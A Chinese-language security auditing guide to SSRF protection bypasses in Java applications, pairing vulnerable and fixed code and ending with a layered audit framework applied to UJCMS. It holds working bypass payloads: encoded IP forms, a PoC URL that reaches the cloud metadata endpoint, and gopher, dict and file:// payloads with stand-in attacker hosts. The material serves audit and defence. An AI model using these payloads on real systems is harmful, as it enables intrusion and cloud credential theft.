# SSRF 防护绕过技术详解

## 目录

- [1. URL 解析差异绕过](#1-url-解析差异绕过)
- [2. DNS 重绑定攻击](#2-dns-重绑定攻击)
- [3. IP 地址表示绕过](#3-ip-地址表示绕过)
- [4. 302 重定向绕过](#4-302-重定向绕过)
- [5. 协议走私](#5-协议走私)
- [6. 白名单绕过模式](#6-白名单绕过模式)
- [7. 综合审计框架](#7-综合审计框架)

---

## 1. URL 解析差异绕过

### 1.1 @ 分隔符攻击

Java `java.net.URL` 的 authority 解析与浏览器/curl 存在差异：

```java
// 校验代码
URL url = new URL("http://evil.com@allowed.com/path");
String host = url.getHost();  // 返回 "allowed.com" (JDK 某些版本)
                              // 但实际 HTTP 请求发送到 evil.com

// 绕过 PoC
POST /api/fetch HTTP/1.1
Content-Type: text/plain

http://169.254.169.254@allowed-domain.com/latest/meta-data/
```

### 1.2 # 片段分隔符

```java
// 校验代码只取 getHost()
URL url = new URL("http://allowed.com#@evil.com/path");
if (isWhitelisted(url.getHost())) {  // "allowed.com" → 通过
    url.openConnection();            // 实际连接到 allowed.com，但路径带了 @evil.com
}

// 变体：利用 fragment 混淆
http://allowed.com%23@evil.com:80/path
```

### 1.3 空字节注入

```java
// 某些 URL 解析库在遇到 \0 时截断
http://evil.com%00.allowed.com  → host 校验为 "allowed.com"，实际连接 evil.com
http://evil.com\0.allowed.com   → 部分解析器截断到 evil.com
```

### 1.4 Unicode/IDN 同形异义字

```
http://аррӏе.com/  ← 西里尔字母，看起来像 "apple.com"
http://allowed.com。evil.com  ← 中文句号作为分隔符
```

### 1.5 URL Schema 解析差异

| 解析库 | `http://evil.com#@allowed.com` 的 getHost() | 实际连接 |
|--------|----------------------------------------------|---------|
| java.net.URL (JDK 8) | allowed.com | allowed.com (安全) |
| java.net.URL (JDK 8u251+) | allowed.com | allowed.com (修复) |
| java.net.URI | evil.com | evil.com (URI 解析正确) |
| OkHttp HttpUrl | allowed.com | allowed.com |
| curl | evil.com | evil.com |
| 浏览器 | evil.com | evil.com |

---

## 2. DNS 重绑定攻击

### 2.1 攻击原理

```
时间线：
T0: 用户请求 http://evil.com/ssrf → 应用校验 DNS: evil.com → 1.2.3.4 (公网 IP) → 通过
T1: 应用发起 HTTP 请求 → 再次 DNS 解析 evil.com → 127.0.0.1 (被攻击者修改)
T2: 请求到达 127.0.0.1:80 → 打到内网服务

关键：利用 T0 和 T1 之间的时间窗口（TOCTOU - Time-of-Check Time-of-Use）
```

### 2.2 审计要点

```java
// ❌ 存在 TOCTOU 窗口的代码模式
InetAddress ip = InetAddress.getByName(url.getHost());  // T0: DNS 解析
if (!isInternal(ip)) {                                   // 校验通过
    url.openConnection();                                // T1: 再次 DNS 解析 → 可能已变
}

// ✅ 无 TOCTOU 窗口（使用 IP 直接连接，避免二次 DNS 解析）
InetAddress ip = InetAddress.getByName(url.getHost());
if (!isInternal(ip)) {
    // 使用 IP 地址而非域名发起连接，避免二次解析
    URL ipUrl = new URL(url.getProtocol(), ip.getHostAddress(), url.getPort(), url.getFile());
    ipUrl.openConnection();
}
```

### 2.3 现实可行性评估

| 条件 | 可行性 |
|------|--------|
| 攻击者控制 DNS 服务器 | ✅ 高 (自建 DNS，设置 TTL=0) |
| 两次 DNS 解析间隔 > 100ms | ✅ 高 (HTTP 请求通常 > 100ms) |
| 需要目标使用特定 DNS | ⚠️ 中 (需要攻击者控制域名) |
| Java DNS 缓存 | ❌ 默认缓存 30s，但可通过 `networkaddress.cache.ttl` 配置 |
| security manager 存在 | ❌ 设置 `networkaddress.cache.ttl=0` 被禁止 |

### 2.4 Java DNS 缓存影响

```bash
# 检查 JVM DNS 缓存配置
java -XX:+PrintFlagsFinal -version | grep networkaddress.cache.ttl

# 默认值: 30s (JDK 8+)，攻击窗口 30 秒
# 如果应用设置了 -Dsun.net.inetaddr.ttl=0，则无缓存，攻击窗口充足
```

---

## 3. IP 地址表示绕过

### 3.1 十进制/八进制/十六进制 IP

黑名单通常只检查点分十进制，但以下形式同样解析为内网 IP：

```
127.0.0.1    → 正常形式
2130706433   → 十进制 (127*256^3 + 0*256^2 + 0*256 + 1)
0177.0.0.1   → 八进制 (0177 = 127)
0x7f.0.0.1   → 十六进制 (0x7f = 127)
0x7f000001   → 十六进制
127.0.0.1.xip.io  → xip.io 通配符 DNS
```

### 3.2 IPv6 绕过

```
::1              → localhost IPv6
::ffff:127.0.0.1 → IPv4-mapped IPv6
[::1]:8080       → IPv6 带端口
[::ffff:169.254.169.254]  → AWS 元数据 IPv4-mapped
```

### 3.3 短地址/URL 缩写

```
http://localhost  → 直接
http://127.1      → 等同于 127.0.0.1 (部分系统)
http://0          → 等同于 0.0.0.0 (监听所有接口)
http://0x7f000001 → 十六进制 IP
```

### 3.4 DNS 通配符/特殊域名

```
localhost           → 127.0.0.1
metadata.google.internal  → GCP 元数据
169.254.169.254.xip.io    → xip.io 解析为 169.254.169.254
1.1.1.1.nip.io            → nip.io 解析为 1.1.1.1
```

### 3.5 审计要点

```java
// ❌ 仅检查点分十进制黑名单
if (host.equals("127.0.0.1") || host.startsWith("10.")) {
    return blocked;
}

// ✅ 必须先解析为 InetAddress 再判断
InetAddress ip = InetAddress.getByName(host);
if (ip.isLoopbackAddress() || ip.isSiteLocalAddress() || ip.isLinkLocalAddress()) {
    return blocked;
}
```

---

## 4. 302 重定向绕过

### 4.1 攻击模式

```
Step 1: POST /api/fetch?url=http://attacker.com/redirect
  - 校验 http://attacker.com → 公网 IP → 通过

Step 2: attacker.com 返回 302 → http://169.254.169.254/latest/meta-data/
  - 客户端跟随重定向 → 请求到达 AWS 元数据服务

关键：first-hop 校验通过，但 redirect target 未经校验
```

### 4.2 Java HTTP 客户端重定向行为

| 客户端 | 默认行为 | 防护 |
|--------|---------|------|
| HttpURLConnection | **默认跟随重定向** | `setInstanceFollowRedirects(false)` |
| Apache HttpClient 4.x | 默认不跟随 (需 LaxRedirectStrategy) | 确保未设置 RedirectStrategy |
| Apache HttpClient 5.x | 默认不跟随 | 确保未设置 RedirectStrategy |
| OkHttp | **默认跟随重定向** | `followRedirects(false)` |
| Spring RestTemplate | **默认跟随重定向** | 使用 `ClientHttpRequestFactory` 禁用 |
| Spring WebClient | 取决于底层客户端 | 配置 `followRedirect(false)` |

### 4.3 审计检查清单

```bash
# 检查是否禁用了重定向跟随
grep -rn "setInstanceFollowRedirects" --include="*.java"
grep -rn "followRedirects\|setFollowRedirects" --include="*.java"
grep -rn "LaxRedirectStrategy\|DefaultRedirectStrategy" --include="*.java"
```

---

## 5. 协议走私

### 5.1 危险协议列表

即使限制了 URL scheme，以下协议可能被滥用：

| 协议 | Payload | 影响 |
|------|---------|------|
| `file://` | `file:///etc/passwd` | 本地文件读取 |
| `gopher://` | `gopher://evil:8080/_POST / HTTP/1.1...` | 伪造任意 TCP 请求 |
| `dict://` | `dict://evil:6379/info` | 探测内网服务 (Redis) |
| `netdoc://` | `netdoc:///etc/passwd` | Java 特定文件读取 |
| `jar://` | `jar:http://evil.com/evil.jar!/` | 远程 jar 加载 |
| `ftp://` | `ftp://evil.com/file` | FTP bounce 攻击 |

### 5.2 审计要点

```java
// ❌ 不完善的协议白名单
if (!"http".equals(protocol) && !"https".equals(protocol)) {
    return blocked;
}

// ✅ 严格的协议白名单 + 大小写处理
String protocol = url.getProtocol().toLowerCase();
if (!"http".equals(protocol) && !"https".equals(protocol)) {
    return blocked;
}

// 注意：某些 URL 解析器对大小写不敏感
// HTTP://evil.com 会被 java.net.URL 的 getProtocol() 返回为 "http"
// 但某些自定义校验可能被绕过
```

---

## 6. 白名单绕过模式

### 6.1 字符串前缀匹配绕过

```java
// ❌ 不安全的字符串前缀匹配
if (host.startsWith("allowed.com")) {   // allowed.com.evil.com 也通过
    ...
}

// ❌ 不安全的 endsWith 匹配
if (host.endsWith("allowed.com")) {     // evilallowed.com 也通过
    ...
}

// ❌ 不安全的 contains 匹配
if (host.contains("allowed.com")) {     // 容易子域名绕过
    ...
}

// ✅ 安全的域名匹配
if (host.equals("allowed.com") ||
    host.endsWith(".allowed.com")) {    // 子域名匹配
    ...
}
```

### 6.2 白名单配置常见漏洞

```java
// 漏洞 1: 允许通配符配置但实际被滥用
ssrfList = ["*"];  // 配置了通配符 → 等于没有白名单

// 漏洞 2: 白名单中包含攻击者可控制的域名
ssrfList = ["github.io"];  // 攻击者可创建 xxx.github.io → 302 到内网

// 漏洞 3: 仅前端校验
// 前端 JS: if (!url.match(/^https?:\/\/allowed\.com/))
// 后端无校验 → 直接绕过前端
```

### 6.3 云服务域名劫持

白名单中包含以下域名时需特别关注：

| 服务 | 域名 | 风险 |
|------|------|------|
| GitHub Pages | `*.github.io` | 攻击者可创建同组织页面 |
| Netlify | `*.netlify.app` | 可创建 redirector |
| Vercel | `*.vercel.app` | 可创建 redirector |
| OSS | `*.oss-cn-*.aliyuncs.com` | bucket 接管 |
| S3 | `*.s3.amazonaws.com` | bucket 接管 |

---

## 7. 综合审计框架

### 7.1 防护层级评估（7 层模型）

审计时按以下 7 层逐层检查防护是否到位：

| 层级 | 防护措施 | 检查项 | 绕过难度 |
|------|---------|--------|---------|
| L1 | 协议校验 | 是否限制 http/https only? 大小写? | 低 |
| L2 | 端口校验 | 是否禁止非默认端口? | 低 |
| L3 | 域名格式校验 | 是否用 DomainValidator? IDN? | 中 |
| L4 | Host 白名单 | 匹配方式是否严格? 通配符范围? | 中 |
| L5 | DNS 反查 | isSiteLocalAddress/isLoopbackAddress? TOCTOU? | 中-高 |
| L6 | URL 重建 | 二次解析防 UC 差异? | 高 |
| L7 | 禁止重定向 | setInstanceFollowRedirects(false)? | 低 |

### 7.2 判定矩阵

```
防护层级 ≥ 5 + 各层无绕过 → ✅ 安全
防护层级 = 3-4 + 有绕过可能 → 🟡 Medium
防护层级 ≤ 2 → 🔴 High/Critical
仅 L1 + L2 → 🔴 极易绕过
仅 L4 (白名单) 但匹配不严格 → 🟡 有绕过可能
```

### 7.3 实战绕过链示例 (UJCMS 审计经验)

```
# UJCMS UploadController.imageFetch 7 层防护分析：
L1 ✅ 协议限制 http/https
L2 ✅ 端口限制默认端口
L3 ✅ DomainValidator 校验域名格式
L4 ✅ Host 白名单 (SSRF_WILDCARD = "*" 则全通过)
L5 ✅ DNS 反查 isSiteLocalAddress/isLoopbackAddress
L6 ✅ URL 重建 (UriComponentsBuilder)
L7 ✅ 禁止重定向 setInstanceFollowRedirects(false)

→ 7 层防护全覆盖，但若白名单配置为 "*" 且内部用户可触发 → 内网可达
→ 判定：有鉴权 + 7层防护 → 风险降级为 Medium，但内网用户仍需关注
```
